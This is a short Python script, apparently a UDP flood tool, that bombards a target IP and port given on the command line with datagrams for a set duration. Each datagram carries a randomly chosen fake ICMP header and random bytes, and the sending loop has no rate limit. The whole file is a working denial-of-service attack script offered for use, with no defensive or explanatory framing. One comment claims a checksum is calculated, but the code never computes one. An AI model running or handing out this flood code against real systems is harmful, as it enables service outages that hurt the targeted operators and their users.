import socket
import struct
import random
import sys
import time

def icmp_over_udp(target_ip, target_port, duration):
    """ICMP-like packets over UDP"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # ICMP Echo Request (Ping) header in UDP payload
    icmp_echo = struct.pack('!BBHHH', 
        8,  # Type: Echo Request
        0,  # Code
        0,  # Checksum (0 for now)
        random.randint(0, 65535),  # Identifier
        random.randint(0, 65535)   # Sequence Number
    )
    
    # ICMP Destination Unreachable
    icmp_unreachable = struct.pack('!BBHHH',
        3,  # Type: Destination Unreachable
        random.choice([0, 1, 3, 4]),  # Code
        0,  # Checksum
        0,  # Unused
        0   # Unused
    )
    
    # ICMP Time Exceeded
    icmp_time_exceeded = struct.pack('!BBHHH',
        11,  # Type: Time Exceeded
        random.choice([0, 1]),  # Code
        0,  # Checksum
        0,  # Unused
        0   # Unused
    )
    
    icmp_packets = [icmp_echo, icmp_unreachable, icmp_time_exceeded]
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        # Select random ICMP type
        icmp_header = random.choice(icmp_packets)
        
        # Add some data (ping data)
        icmp_data = random._urandom(random.randint(32, 100))
        
        # Combine and calculate checksum (simple XOR checksum)
        packet = icmp_header + icmp_data
        
        # Send as UDP payload
        sock.sendto(packet, (target_ip, target_port))
        
        # Send multiple packets per iteration
        for _ in range(random.randint(1, 5)):
            sock.sendto(packet, (target_ip, target_port))
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    icmp_over_udp(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
